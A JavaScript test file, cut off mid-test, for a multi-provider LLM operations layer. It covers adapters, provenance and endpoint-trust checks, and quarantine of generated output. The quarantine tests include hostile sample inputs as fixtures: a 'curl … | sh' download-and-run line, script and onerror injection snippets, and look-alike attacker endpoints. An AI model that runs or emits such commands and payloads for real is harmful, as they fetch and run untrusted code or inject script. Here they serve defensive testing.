import test from 'node:test';
import assert from 'node:assert/strict';
import {readFile} from 'node:fs/promises';
import {spawnSync} from 'node:child_process';
import {fileURLToPath} from 'node:url';
import {
  MODEL_MANIFEST,modelBinding,modelCatalogStatus,assertTrustedBinding,assertFailoverAllowed,validateModelRequest,invokeModel,buildProviderRequest,
  classifyGeneratedOutput,planCheckpointInstall,routeModel,backoffDelayMs,nextBreakerState,runAdapterBenchmark,BENCHMARK_CASES,providerStubBody,
  planModelSmoke,runModelSmoke,ModelOperations,ProviderCallError,detectGrokModels,schemaErrors,worstCaseCostCents,complete,providerConfiguration,
  disallowedModelLineage,tenant,ControlPlane
} from '../packages/operations/dist/index.js';
import {setup,org,owner,agent,ctx} from './helpers/operations-fixture.mjs';

const root=fileURLToPath(new URL('..',import.meta.url));
const paidEnv={MODEL_API_ENABLED:'true',OWNER_SPEND_AUTHORIZATION_ID:'synthetic-owner-authorization',PAID_SPEND_LIMIT_CENTS:'500',
  OPENAI_ENABLED:'true',OPENAI_API_KEY:'synthetic-openai-credential',OPENAI_MODEL:'gpt-fixture-1',OPENAI_INPUT_CENTS_PER_MILLION:'10000',OPENAI_OUTPUT_CENTS_PER_MILLION:'40000',
  CLAUDE_ENABLED:'true',CLAUDE_API_KEY:'synthetic-claude-credential',CLAUDE_MODEL:'claude-fixture-1',CLAUDE_INPUT_CENTS_PER_MILLION:'10000',CLAUDE_OUTPUT_CENTS_PER_MILLION:'40000',CLAUDE_CACHED_INPUT_CENTS_PER_MILLION:'1000',
  GROK_ENABLED:'true',GROK_API_KEY:'synthetic-grok-credential',GROK_MODEL:'grok-fixture-1',GROK_INPUT_CENTS_PER_MILLION:'10000',GROK_OUTPUT_CENTS_PER_MILLION:'40000'};
const freeEnv={FREE_MODEL_API_ENABLED:'true',OPENROUTER_ENABLED:'true',OPENROUTER_API_KEY:'synthetic-openrouter-credential'};
const gemma='google/gemma-4-31b-it:free';
const req=(key,extra={})=>({system:'Synthetic system',messages:[{role:'user',content:'Synthetic public brief'}],maxOutputTokens:200,timeoutMs:5000,privacyClass:'public',idempotencyKey:key,...extra});
const never=async()=>{throw new Error('network must not be called');};
const openaiOk=(text='Draft',extra={})=>Response.json({id:'resp_fixture',model:'gpt-fixture-1',status:'completed',output:[{type:'message',content:[{type:'output_text',text}]}],usage:{input_tokens:100,output_tokens:50,input_tokens_details:{cached_tokens:0},output_tokens_details:{reasoning_tokens:10}},...extra});
const sse=events=>new Response(events.map(e=>`data: ${JSON.stringify(e)}\n\n`).join('')+'data: [DONE]\n\n',{headers:{'content-type':'text/event-stream'}});
const binding=(id,env=paidEnv)=>modelBinding(id,env);
const grokTransport=(handler,models=['grok-fixture-1'])=>async(url,init)=>url==='https://api.x.ai/v1/models'?Response.json({data:models.map(id=>({id}))}):handler(url,init);
const lookupTool={name:'lookup_account',description:'Read a synthetic CRM account',parameters:{type:'object',properties:{accountId:{type:'string'}},required:['accountId'],additionalProperties:false}};
const code=re=>err=>{assert.match(err.code??err.message,re);return true;};

test('DOTS-055 manifest lists every approved provider, discloses missing credentials and keeps the registry candidates disabled',async()=>{
  assert.deepEqual(Object.keys(MODEL_MANIFEST).sort(),['claude','grok','openai','openrouter']);
  const empty=modelCatalogStatus({});
  assert.equal(empty.length,4);
  for(const p of empty){assert.equal(p.state,'not_connected');assert.equal(p.credential.present,false);assert.ok(p.reasons.includes(`MISSING_${p.credential.name}`));assert.equal(p.configuredModel,null);}
  assert.equal(empty.find(p=>p.id==='openrouter').privacyCeiling,'public');
  const ready=modelCatalogStatus({...paidEnv,...freeEnv});
  assert.deepEqual(ready.map(p=>p.state),['ready','ready','ready','ready']);
  assert.doesNotMatch(JSON.stringify(ready),/synthetic-[a-z]+-credential/);
  const unfunded=modelCatalogStatus({...paidEnv,PAID_SPEND_LIMIT_CENTS:'0'});
  assert.equal(unfunded.find(p=>p.id==='openai').state,'unfunded');assert.equal(unfunded.find(p=>p.id==='openai').costStatus,'unfunded');
  const invalid=modelCatalogStatus({...paidEnv,OPENAI_MODEL:'qwen3-coder'});
  assert.equal(invalid.find(p=>p.id==='openai').state,'configuration_invalid');
  const catalog=JSON.parse(await readFile(new URL('../registry/model-catalog.json',import.meta.url),'utf8'));
  assert.deepEqual(catalog.candidates.map(c=>c.id).sort(),['claude','grok','openai']);
  assert.ok(catalog.candidates.every(c=>c.enabled===false));
});

test('DOTS-055 revisions are append-only: upgrades and retirements add rows and never rewrite history; tenant isolated',async()=>{
  const {db,client}=await setup();try{
    const ops=new ModelOperations(client,ctx);
    const first=await ops.registerRevision({provider:'openai',model:'gpt-fixture-1',reviewRef:'synthetic-review-1'});
    const second=await ops.registerRevision({provider:'openai',model:'gpt-fixture-1',reviewRef:'synthetic-review-2',capabilities:{contextWindow:128000}});
    const retired=await ops.registerRevision({provider:'openai',model:'gpt-fixture-1',status:'retired',reviewRef:'synthetic-retirement'});
    assert.deepEqual([first.revision,second.revision,retired.revision],[1,2,3]);
    const all=(await db.query("SELECT revision,status,snapshot_hash FROM app.model_revisions ORDER BY revision")).rows;
    assert.equal(all.length,3);assert.equal(all[0].snapshot_hash,first.snapshot_hash);assert.equal(all[0].status,'approved');
    await assert.rejects(db.query("UPDATE app.model_revisions SET status='approved' WHERE revision=3"),/append-only/);
    await assert.rejects(db.query('DELETE FROM app.model_revisions'),/append-only/);
    await assert.rejects(ops.registerRevision({provider:'openai',model:'qwen/qwen3-coder',reviewRef:'x'}),code(/PROVIDER_MODEL_NOT_ALLOWED/));
    await assert.rejects(ops.registerRevision({provider:'openai',model:'claude-fixture-1',reviewRef:'x'}),code(/PROVIDER_MODEL_MISMATCH/));
    await assert.rejects(ops.registerRevision({provider:'openrouter',model:'google/gemma-3-27b-it:free',reviewRef:'x'}),code(/PROVIDER_MODEL_MISMATCH/));
    await assert.rejects(ops.registerRevision({provider:'openrouter',model:gemma,privacyClass:'private',reviewRef:'x'}),code(/MODEL_PRIVACY_NOT_PERMITTED/));
    await assert.rejects(ops.registerRevision({provider:'groq',model:'gpt-fixture-1',reviewRef:'x'}),code(/INVALID_PROVIDER/));
    const approved=await ops.approvedRevisions();
    assert.throws(()=>assertTrustedBinding(binding('openai'),approved),code(/MODEL_REVISION_NOT_APPROVED/));
    const other='66666666-6666-4666-8666-666666666666',otherMember='77777777-7777-4777-8777-777777777777';
    await db.query("INSERT INTO app.organizations(id,slug,display_name) VALUES($1,'other-models','Other synthetic organization')",[other]);
    await db.query("INSERT INTO app.owner_users(id,identity_subject,display_name) VALUES($1,'other-models-owner','Other owner')",[otherMember]);
    await db.exec(`SELECT set_config('app.organization_id','${other}',false);SELECT set_config('app.audit_actor_membership_id','${otherMember}',false);`);
    await db.query("INSERT INTO app.memberships(id,organization_id,user_id,role) VALUES($1,$2,$1,'owner')",[otherMember,other]);
    assert.equal((await new ModelOperations(client,{organizationId:other,membershipId:otherMember}).approvedRevisions()).length,0);
  }finally{await db.close();}
});

test('DOTS-056 canonical contract rejects malformed requests and fails closed on schema violations, empty output and cancellation',async()=>{
  const openai=binding('openai');
  assert.throws(()=>validateModelRequest(req('k',{tools:[{name:'bad name',description:'x',parameters:{}}]})),code(/MODEL_TOOL_DEFINITION_INVALID/));
  assert.throws(()=>validateModelRequest(req('k',{messages:[{role:'tool',toolCallId:'nope',content:'x'}]})),code(/MODEL_TOOL_RESULT_UNMATCHED/));
  assert.throws(()=>validateModelRequest(req('k',{timeoutMs:10})),code(/MODEL_TIMEOUT_INVALID/));
  assert.throws(()=>validateModelRequest(req('k',{privacyClass:'private'}),binding('openrouter',freeEnv)),code(/MODEL_PRIVACY_NOT_PERMITTED/));
  assert.throws(()=>validateModelRequest(req('k',{privacyClass:'private'}),openai),code(/MODEL_PRIVACY_NOT_PERMITTED/),'paid providers need an owner data-processing attestation for private data');
  validateModelRequest(req('k',{privacyClass:'private'}),binding('openai',{...paidEnv,OPENAI_PRIVATE_DATA_APPROVED:'true'}));
  const schema={name:'lead_summary',schema:{type:'object',properties:{score:{type:'integer'},reason:{type:'string'}},required:['score','reason'],additionalProperties:false}};
  assert.deepEqual(schemaErrors({score:1},schema.schema),['$.reason: required']);
  await assert.rejects(invokeModel(openai,req('s1',{responseSchema:schema}),{transport:async()=>openaiOk('not json')}),err=>{assert.ok(err instanceof ProviderCallError);assert.equal(err.code,'MODEL_SCHEMA_VIOLATION');assert.equal(err.executed,'yes');assert.equal(err.result.usage.inputTokens,100);return true;});
  await assert.rejects(invokeModel(openai,req('s2',{responseSchema:schema}),{transport:async()=>openaiOk('{"score":"high","reason":"x"}')}),code(/MODEL_SCHEMA_VIOLATION/));
  const good=await invokeModel(openai,req('s3',{responseSchema:schema}),{transport:async()=>openaiOk('{"score":7,"reason":"Synthetic"}')});
  assert.deepEqual(good.structured,{score:7,reason:'Synthetic'});
  for(const id of ['openai','claude','grok']){
    const empty=id==='openai'?{id:'e',model:'gpt-fixture-1',status:'completed',output:[],usage:{input_tokens:1,output_tokens:0}}:id==='claude'?{id:'e',model:'claude-fixture-1',content:[],stop_reason:'end_turn',usage:{input_tokens:1,output_tokens:0}}:{id:'e',model:'grok-fixture-1',choices:[{message:{content:''},finish_reason:'stop'}],usage:{prompt_tokens:1,completion_tokens:0}};
    await assert.rejects(invokeModel(binding(id),req('e'),{transport:grokTransport(async()=>Response.json(empty))}),code(/PROVIDER_RESPONSE_EMPTY/),id);
    await assert.rejects(invokeModel(binding(id),req('j'),{transport:grokTransport(async()=>new Response('{not json'))}),code(/PROVIDER_RESPONSE_INVALID/),id);
  }
  const aborted=new AbortController();aborted.abort();
  await assert.rejects(invokeModel(openai,req('c1'),{signal:aborted.signal,transport:never}),code(/MODEL_CANCELLED/));
  const live=new AbortController();let called=false;
  const pending=invokeModel(openai,req('c2'),{signal:live.signal,transport:(_url,init)=>new Promise((_resolve,reject)=>{called=true;init.signal.addEventListener('abort',()=>reject(init.signal.reason));})});
  await new Promise(r=>setImmediate(r));assert.ok(called);live.abort();
  await assert.rejects(pending,err=>{assert.equal(err.code,'MODEL_CANCELLED');assert.equal(err.executed,'unknown');return true;});
  await assert.rejects(invokeModel(openai,req('t1'),{transport:async()=>{throw new DOMException('timed out','TimeoutError');}}),err=>{assert.equal(err.code,'PROVIDER_TIMEOUT');assert.equal(err.executed,'unknown');assert.equal(err.retryable,false);return true;});
  await assert.rejects(invokeModel(openai,req('r1'),{transport:async()=>new Response('',{status:429,headers:{'retry-after':'2'}})}),err=>{assert.equal(err.code,'PROVIDER_RATE_LIMITED');assert.equal(err.retryable,true);assert.equal(err.executed,'no');assert.equal(err.retryAfterMs,2000);return true;});
  await assert.rejects(invokeModel(openai,req('r2'),{transport:async()=>new Response('',{status:401})}),code(/PROVIDER_CREDENTIAL_REJECTED/));
});

test('DOTS-056 streamed and non-streamed provider payloads normalize to the same canonical result',async()=>{
  const cases={
    openai:{plain:openaiOk('Hello world'),stream:[{type:'response.created',response:{id:'resp_fixture'}},{type:'response.output_text.delta',delta:'Hello '},{type:'response.output_text.delta',delta:'world'},{type:'response.completed',response:{id:'resp_fixture',model:'gpt-fixture-1',status:'completed',output:[{type:'message',content:[{type:'output_text',text:'Hello world'}]}],usage:{input_tokens:100,output_tokens:50,input_tokens_details:{cached_tokens:0},output_tokens_details:{reasoning_tokens:10}}}}]},
    claude:{plain:Response.json({id:'msg_fixture',model:'claude-fixture-1',content:[{type:'text',text:'Hello world'}],stop_reason:'end_turn',usage:{input_tokens:100,output_tokens:50}}),stream:[{type:'message_start',message:{id:'msg_fixture',model:'claude-fixture-1',usage:{input_tokens:100,output_tokens:1}}},{type:'content_block_start',index:0,content_block:{type:'text',text:''}},{type:'content_block_delta',index:0,delta:{type:'text_delta',text:'Hello '}},{type:'content_block_delta',index:0,delta:{type:'text_delta',text:'world'}},{type:'content_block_stop',index:0},{type:'message_delta',delta:{stop_reason:'end_turn'},usage:{output_tokens:50}},{type:'message_stop'}]},
    grok:{plain:Response.json({id:'chat_fixture',model:'grok-fixture-1',choices:[{message:{content:'Hello world'},finish_reason:'stop'}],usage:{prompt_tokens:100,completion_tokens:50}}),stream:[{id:'chat_fixture',model:'grok-fixture-1',choices:[{delta:{content:'Hello '}}]},{id:'chat_fixture',model:'grok-fixture-1',choices:[{delta:{content:'world'},finish_reason:'stop'}]},{id:'chat_fixture',model:'grok-fixture-1',choices:[],usage:{prompt_tokens:100,completion_tokens:50}}]},
  };
  for(const [id,fixture] of Object.entries(cases)){
    let streamBody;
    const plain=await invokeModel(binding(id),req('p'),{transport:grokTransport(async()=>fixture.plain)});
    const streamed=await invokeModel(binding(id),req('s',{stream:true}),{transport:grokTransport(async(_u,init)=>{streamBody=JSON.parse(init.body);return sse(fixture.stream);})});
    assert.equal(streamBody.stream,true,id);
    assert.equal(streamed.streamed,true);assert.equal(plain.streamed,false);
    for(const key of ['text','finishReason','providerRequestId','costCents','toolCalls'])assert.deepEqual(streamed[key],plain[key],`${id} ${key}`);
    assert.equal(streamed.usage.inputTokens,plain.usage.inputTokens);assert.equal(streamed.usage.outputTokens,plain.usage.outputTokens);
    assert.equal(plain.text,'Hello world');assert.equal(plain.costCents,3);
  }
  // A truncated stream without usage is costed at the worst-case estimate and flagged, never assumed zero.
  const truncated=await invokeModel(binding('openai'),req('t',{stream:true}),{transport:async()=>sse([{type:'response.output_text.delta',delta:'Partial'}])});
  assert.equal(truncated.usage.source,'missing');assert.equal(truncated.costBasis,'worst_case_estimate');assert.equal(truncated.costCents,worstCaseCostCents(binding('openai'),req('t',{stream:true})));assert.equal(truncated.finishReason,'other');
  await assert.rejects(invokeModel(binding('openrouter',freeEnv),req('fs',{stream:true}),{transport:never}),code(/MODEL_CAPABILITY_UNSUPPORTED/));
});

test('DOTS-057 OpenAI Responses adapter maps function tools, strict schemas, tool turns, usage, refusals and truncation',async()=>{
  const openai=binding('openai');let sent,headers;
  const request=req('o1',{tools:[lookupTool],messages:[{role:'user',content:'Check synthetic-1'},{role:'assistant',content:'',toolCalls:[{id:'call_0',name:'lookup_account',arguments:{accountId:'synthetic-0'}}]},{role:'tool',toolCallId:'call_0',content:'{"stage":"new"}'}],responseSchema:{name:'answer',schema:{type:'object'}}});
  const result=await invokeModel(openai,request,{transport:async(url,init)=>{sent=JSON.parse(init.body);headers=init.headers;assert.equal(url,'https://api.openai.com/v1/responses');assert.equal(init.redirect,'error');
    return Response.json({id:'resp_tool',model:'gpt-fixture-1-2026-01-01',status:'completed',output:[{type:'function_call',call_id:'call_1',name:'lookup_account',arguments:'{"accountId":"synthetic-1"}'}],usage:{input_tokens:1000,output_tokens:20,input_tokens_details:{cached_tokens:400},output_tokens_details:{reasoning_tokens:12}}});}});
  assert.equal(headers.authorization,'Bearer synthetic-openai-credential');
  assert.equal(sent.store,false);assert.equal(sent.instructions,'Synthetic system');assert.equal(sent.max_output_tokens,200);
  assert.deepEqual(sent.tools,[{type:'function',name:'lookup_account',description:lookupTool.description,parameters:lookupTool.parameters,strict:true}]);
  assert.deepEqual(sent.text.format,{type:'json_schema',name:'answer',schema:{type:'object'},strict:true});
  assert.deepEqual(sent.input.slice(1),[{type:'function_call',call_id:'call_0',name:'lookup_account',arguments:'{"accountId":"synthetic-0"}'},{type:'function_call_output',call_id:'call_0',output:'{"stage":"new"}'}]);
  assert.deepEqual(result.toolCalls,[{id:'call_1',name:'lookup_account',arguments:{accountId:'synthetic-1'}}]);
  assert.equal(result.finishReason,'tool_calls');assert.equal(result.responseModel,'gpt-fixture-1-2026-01-01');
  assert.deepEqual(result.usage,{inputTokens:1000,outputTokens:20,cachedInputTokens:400,reasoningTokens:12,source:'provider_reported'});
  assert.equal(result.costCents,Math.ceil((1000*10000+20*40000)/1e6));
  const refusal=await invokeModel(openai,req('o2'),{transport:async()=>Response.json({id:'r',model:'gpt-fixture-1',status:'completed',output:[{type:'message',content:[{type:'refusal',refusal:'I cannot help with that.'}]}],usage:{input_tokens:5,output_tokens:5}})});
  assert.equal(refusal.finishReason,'refusal');assert.equal(refusal.refusal,'I cannot help with that.');
  const truncated=await invokeModel(openai,req('o3'),{transport:async()=>Response.json({id:'r',model:'gpt-fixture-1',status:'incomplete',incomplete_details:{reason:'max_output_tokens'},output:[{type:'message',content:[{type:'output_text',text:'Partial'}]}],usage:{input_tokens:5,output_tokens:200}})});
  assert.equal(truncated.finishReason,'length');
  await assert.rejects(invokeModel(openai,req('o4',{tools:[lookupTool]}),{transport:async()=>Response.json({id:'r',model:'gpt-fixture-1',status:'completed',output:[{type:'function_call',call_id:'c',name:'send_email',arguments:'{}'}],usage:{input_tokens:1,output_tokens:1}})}),code(/MODEL_TOOL_UNDECLARED/));
  await assert.rejects(invokeModel(openai,req('o5',{tools:[lookupTool]}),{transport:async()=>Response.json({id:'r',model:'gpt-fixture-1',status:'completed',output:[{type:'function_call',call_id:'c',name:'lookup_account',arguments:'{"accountId":1}'}],usage:{input_tokens:1,output_tokens:1}})}),code(/MODEL_TOOL_ARGUMENTS_INVALID/));
  assert.match(MODEL_MANIFEST.openai.notes,/ChatGPT subscription is not API credit/);
});

test('DOTS-058 Claude Messages adapter maps tool_use/tool_result turns, refusal, max_tokens and cache-aware token accounting',async()=>{
  const claude=binding('claude');let sent,headers;
  const request=req('c1',{tools:[lookupTool],messages:[{role:'user',content:'Check two accounts'},{role:'assistant',content:'Looking up.',toolCalls:[{id:'toolu_1',name:'lookup_account',arguments:{accountId:'a'}},{id:'toolu_2',name:'lookup_account',arguments:{accountId:'b'}}]},{role:'tool',toolCallId:'toolu_1',content:'new'},{role:'tool',toolCallId:'toolu_2',content:'won'}]});
  const result=await invokeModel(claude,request,{transport:async(url,init)=>{sent=JSON.parse(init.body);headers=init.headers;assert.equal(url,'https://api.anthropic.com/v1/messages');
    return Response.json({id:'msg_1',model:'claude-fixture-1',stop_reason:'tool_use',content:[{type:'text',text:'One more.'},{type:'tool_use',id:'toolu_3',name:'lookup_account',input:{accountId:'c'}}],usage:{input_tokens:200,output_tokens:30,cache_read_input_tokens:800,cache_creation_input_tokens:0}});}});
  assert.equal(headers['x-api-key'],'synthetic-claude-credential');assert.equal(headers['anthropic-version'],'2023-06-01');assert.equal(headers.authorization,undefined);
  assert.equal(sent.system,'Synthetic system');assert.equal(sent.max_tokens,200);
  assert.deepEqual(sent.tools,[{name:'lookup_account',description:lookupTool.description,input_schema:lookupTool.parameters}]);
  assert.deepEqual(sent.messages.map(m=>m.role),['user','assistant','user'],'consecutive tool results merge into one user turn');
  assert.deepEqual(sent.messages[1].content.map(b=>b.type),['text','tool_use','tool_use']);
  assert.deepEqual(sent.messages[2].content,[{type:'tool_result',tool_use_id:'toolu_1',content:'new'},{type:'tool_result',tool_use_id:'toolu_2',content:'won'}]);
  assert.deepEqual(result.toolCalls,[{id:'toolu_3',name:'lookup_account',arguments:{accountId:'c'}}]);assert.equal(result.finishReason,'tool_calls');
  assert.deepEqual(result.usage,{inputTokens:1000,outputTokens:30,cachedInputTokens:800,reasoningTokens:0,source:'provider_reported'});
  assert.equal(result.costCents,Math.ceil((200*10000+800*1000+30*40000)/1e6),'cache reads are priced at the cached rate');
  const refusal=await invokeModel(claude,req('c2'),{transport:async()=>Response.json({id:'msg_2',model:'claude-fixture-1',stop_reason:'refusal',content:[],usage:{input_tokens:10,output_tokens:0}})});
  assert.equal(refusal.finishReason,'refusal');assert.ok(refusal.refusal);assert.equal(refusal.text,'');
  const length=await invokeModel(claude,req('c3'),{transport:async()=>Response.json({id:'msg_3',model:'claude-fixture-1',stop_reason:'max_tokens',content:[{type:'text',text:'Cut'}],usage:{input_tokens:10,output_tokens:200}})});
  assert.equal(length.finishReason,'length');
  const streamTool=await invokeModel(claude,req('c4',{tools:[lookupTool],stream:true}),{transport:async()=>sse([{type:'message_start',message:{id:'msg_4',model:'claude-fixture-1',usage:{input_tokens:10,output_tokens:1}}},{type:'content_block_start',index:0,content_block:{type:'tool_use',id:'toolu_9',name:'lookup_account',input:{}}},{type:'content_block_delta',index:0,delta:{type:'input_json_delta',partial_json:'{"accountId":'}},{type:'content_block_delta',index:0,delta:{type:'input_json_delta',partial_json:'"z"}'}},{type:'message_delta',delta:{stop_reason:'tool_use'},usage:{output_tokens:9}}])});
  assert.deepEqual(streamTool.toolCalls,[{id:'toolu_9',name:'lookup_account',arguments:{accountId:'z'}}]);assert.equal(streamTool.usage.outputTokens,9);
});

test('DOTS-059 Grok adapter verifies account model availability, maps tools and schema, and fails closed for unavailable models',async()=>{
  const grok=binding('grok');const calls=[];
  const result=await invokeModel(grok,req('g1',{tools:[lookupTool],responseSchema:{name:'answer',schema:{type:'object'}}}),{transport:grokTransport(async(url,init)=>{calls.push(url);const body=JSON.parse(init.body);
    assert.equal(url,'https://api.x.ai/v1/chat/completions');assert.equal(init.headers.authorization,'Bearer synthetic-grok-credential');
    assert.deepEqual(body.tools,[{type:'function',function:{name:'lookup_account',description:lookupTool.description,parameters:lookupTool.parameters}}]);
    assert.equal(body.response_format.type,'json_schema');assert.equal(body.stream,false);assert.equal(body.messages[0].role,'system');
    return Response.json({id:'chat_1',model:'grok-fixture-1',choices:[{message:{content:null,tool_calls:[{id:'call_g',type:'function',function:{name:'lookup_account',arguments:'{"accountId":"g"}'}}]},finish_reason:'tool_calls'}],usage:{prompt_tokens:50,completion_tokens:10,prompt_tokens_details:{cached_tokens:20},completion_tokens_details:{reasoning_tokens:4}}});})});
  assert.deepEqual(result.toolCalls,[{id:'call_g',name:'lookup_account',arguments:{accountId:'g'}}]);assert.equal(result.usage.reasoningTokens,4);assert.equal(result.usage.cachedInputTokens,20);
  let posts=0;
  await assert.rejects(invokeModel(grok,req('g2'),{transport:grokTransport(async()=>{posts++;return openaiOk();},['grok-other'])}),code(/PROVIDER_MODEL_UNAVAILABLE/));
  assert.equal(posts,0,'unavailable account model never receives the request');
  assert.deepEqual(await detectGrokModels(grok,async()=>Response.json({data:[{id:'grok-fixture-1'},{id:'deepseek-r1'},{id:'grok-qwen-mix'},{id:'llama-3'}]})),['grok-fixture-1']);
  await assert.rejects(detectGrokModels(grok,async()=>new Response('',{status:401})),code(/PROVIDER_CREDENTIAL_REJECTED/));
  const unknown=await invokeModel(grok,req('g3'),{transport:grokTransport(async()=>Response.json({id:'chat_3',model:'grok-fixture-1',choices:[{message:{content:'ok'},finish_reason:'weird'}],usage:{prompt_tokens:1,completion_tokens:1}}))});
  assert.equal(unknown.finishReason,'other');
});

test('DOTS-060/061 provenance and trusted endpoint policy deny disallowed lineage, overrides, unknown models, mismatches, substitution and paid fallback before dispatch',async()=>{
  // Disallowed model offered by an otherwise approved host or broker.
  for(const [provider,model] of [['openrouter','qwen/qwen3-coder:free'],['openrouter','deepseek/deepseek-chat-v3:free'],['openrouter','z-ai/glm-4.5-air:free'],['openrouter','moonshotai/kimi-k2:free'],['grok','grok-deepseek-distill'],['openai','gpt-4o-qwen-merge'],['claude','claude-mimo-bridge'],['grok','grok-yi-34b']]){
    const b={...binding(provider==='openrouter'?'openrouter':provider,provider==='openrouter'?freeEnv:paidEnv),model};
    await assert.rejects(invokeModel(b,req('d'),{transport:never}),code(/PROVIDER_MODEL_NOT_ALLOWED|FREE_PROVIDER_CONFIGURATION_INVALID/),model);
    assert.ok(disallowedModelLineage(model)||provider==='openrouter',model);
  }
  for(const id of ['OPENAI','CLAUDE','GROK'])assert.throws(()=>providerConfiguration(id.toLowerCase(),{...paidEnv,[`${id}_MODEL`]:'ernie-4.5'}),/PROVIDER_MODEL_NOT_ALLOWED/);
  // Endpoint overrides, including look-alike hosts, credentials and ports.
  for(const endpoint of ['https://proxy.example.invalid/v1/responses','https://api.openai.com.evil.invalid/v1/responses','https://user:pw@api.openai.com/v1/responses','https://api.openai.com:8443/v1/responses','http://api.openai.com/v1/responses'])
    await assert.rejects(invokeModel({...binding('openai'),endpoint},req('e'),{transport:never}),code(/PROVIDER_ENDPOINT_NOT_TRUSTED/),endpoint);
  // Mismatched host/model (an approved model on another approved provider's endpoint) and broker namespaces.
  for(const [provider,model] of [['openai','claude-fixture-1'],['claude','gpt-fixture-1'],['grok','gpt-fixture-1'],['openai','anthropic/claude-fixture-1'],['claude','grok-fixture-1']])
    await assert.rejects(invokeModel({...binding(provider),model},req('m'),{transport:never}),code(/PROVIDER_MODEL_MISMATCH/),`${provider}:${model}`);
  await assert.rejects(complete({id:'openai',model:'claude-fixture-1',endpoint:'https://api.openai.com/v1/responses',apiKey:'k',inputCentsPerMillion:0,outputCentsPerMillion:0,maxOutputTokens:10},'s','p',undefined,never),/PROVIDER_MODEL_MISMATCH/);
  for(const id of ['groq','deepseek','qwen','together','fireworks'])await assert.rejects(invokeModel({...binding('openai'),provider:id},req('p'),{transport:never}),code(/PROVIDER_NOT_ALLOWED/),id);
  // Unknown / unreviewed model when an approved revision list is enforced.
  await assert.rejects(invokeModel(binding('openai'),req('u'),{transport:never,approved:[]}),code(/MODEL_NOT_REVIEWED/));
  await assert.rejects(invokeModel(binding('openai'),req('u'),{transport:never,approved:[{provider:'openai',model:'gpt-fixture-1',revision:1,status:'approved'},{provider:'openai',model:'gpt-fixture-1',revision:2,status:'denied'}]}),code(/MODEL_REVISION_NOT_APPROVED/));
  // Free route cannot be repriced, re-billed or retargeted.
  await assert.rejects(invokeModel({...binding('openrouter',freeEnv),pricing:{inputCentsPerMillion:1,outputCentsPerMillion:0}},req('f'),{transport:never}),code(/FREE_PROVIDER_CONFIGURATION_INVALID/));
  await assert.rejects(invokeModel({...binding('openrouter',freeEnv),billingMode:'paid'},req('f'),{transport:never}),code(/FREE_PROVIDER_CONFIGURATION_INVALID/));
  const openrouterBody=buildProviderRequest(binding('openrouter',freeEnv),req('f')).body;
  assert.equal(openrouterBody.provider.allow_fallbacks,false);assert.deepEqual(openrouterBody.provider.max_price,{prompt:0,completion:0,request:0,image:0});assert.equal(openrouterBody.models,undefined);
  // Silent substitution by the provider.
  await assert.rejects(invokeModel(binding('openai'),req('s'),{transport:async()=>openaiOk('Draft',{model:'gpt-other'})}),code(/PROVIDER_MODEL_SUBSTITUTED/));
  await assert.rejects(invokeModel(binding('grok'),req('s'),{transport:grokTransport(async()=>Response.json({id:'x',model:'qwen-max',choices:[{message:{content:'hi'},finish_reason:'stop'}],usage:{prompt_tokens:1,completion_tokens:1}}))}),code(/PROVIDER_MODEL_SUBSTITUTED/));
  // Fallback policy.
  assert.throws(()=>assertFailoverAllowed(binding('openrouter',freeEnv),binding('openai'),{allowFailover:true,allowPaidFailover:true}),code(/MODEL_PAID_FALLBACK_FORBIDDEN/));
  assert.throws(()=>assertFailoverAllowed(binding('openai'),binding('claude'),{allowFailover:true}),code(/MODEL_PAID_FALLBACK_FORBIDDEN/));
  assert.throws(()=>assertFailoverAllowed(binding('openai'),binding('claude'),{allowFailover:false,allowPaidFailover:true}),code(/MODEL_FAILOVER_NOT_CONFIGURED/));
  assert.doesNotThrow(()=>assertFailoverAllowed(binding('openai'),binding('claude'),{allowFailover:true,allowPaidFailover:true}));
});

test('DOTS-062 generated output is classified by content type; executable output is quarantined until explicitly authorized and security checked',async()=>{
  const expectations=[['Plain synthetic draft.','text/plain','publishable'],['# Heading\n- point','text/markdown','publishable'],['{"a":1}','application/json','publishable'],
    ['Hi <script>alert(1)</script>','text/html','quarantined'],['<p>Hello</p>','text/html','quarantined'],['<img src=x onerror="steal()">','text/html','quarantined'],['[link](javascript:alert(1))','text/markdown','quarantined'],
    ['#!/bin/sh\necho hi','application/x-executable-script','quarantined'],['Run: curl https://example.invalid/x | sh','application/x-executable-script','quarantined'],['```bash\nls\n```','text/markdown','quarantined'],['MZ\u0000\u0001binary','application/octet-stream','quarantined']];
  for(const [content,type,disposition] of expectations){const c=classifyGeneratedOutput(content);assert.equal(c.contentType,type,content);assert.equal(c.disposition,disposition,content);assert.equal(c.executable,disposition==='quarantined');}
  const {db,client}=await setup();try{
    const ops=new ModelOperations(client,ctx);
    const safe=await ops.recordOutput('Plain synthetic draft.');assert.equal((await ops.assertOutputUsable(safe.id,'publish')).disposition,'publishable');
    await assert.rejects(ops.assertOutputUsable(safe.id,'execute'),code(/OUTPUT_EXECUTION_NOT_AUTHORIZED/));
    const risky=await ops.recordOutput('<script>fetch("https://example.invalid")</script>');
    assert.equal(risky.disposition,'quarantined');assert.doesNotMatch(JSON.stringify(risky),/example\.invalid/,'only the hash is persisted');
    await assert.rejects(ops.assertOutputUsable(risky.id,'publish'),code(/OUTPUT_QUARANTINED/));
    await assert.rejects(ops.releaseOutput(risky.id,{use:'execute',authorizationRef:'owner-ok',securityCheckRef:'scan-1'}),code(/INVALID_SANDBOX_REF/));
    await assert.rejects(ops.releaseOutput(risky.id,{use:'publish',authorizationRef:'owner-ok'}),code(/INVALID_SECURITY_CHECK_REF/));
    await assert.rejects(ops.releaseOutput(safe.id,{use:'publish',authorizationRef:'owner-ok',securityCheckRef:'scan-1'}),code(/OUTPUT_NOT_QUARANTINED/));
    await ops.releaseOutput(risky.id,{use:'publish',authorizationRef:'owner-ok',securityCheckRef:'scan-1'});
    assert.equal((await ops.assertOutputUsable(risky.id,'publish')).security_check_ref,'scan-1');
    await assert.rejects(ops.assertOutputUsable(risky.id,'execute'),code(/OUTPUT_EXECUTION_NOT_AUTHORIZED/),'publish release never authorizes execution');
    const script=await ops.recordOutput('#!/bin/sh\necho synthetic');
    await ops.releaseOutput(script.id,{use:'execute',authorizationRef:'owner-ok',securityCheckRef:'scan-2',sandboxRef:'isolated-sandbox-1'});
    assert.equal((await ops.assertOutputUsable(script.id,'execute')).sandbox_ref,'isolated-sandbox-1');
    await tenant(client,ctx,async tx=>{await assert.rejects(tx.query("UPDATE app.generated_outputs SET content_hash=$2 WHERE id=$1",[script.id,'0'.repeat(64)]),/immutable/);});
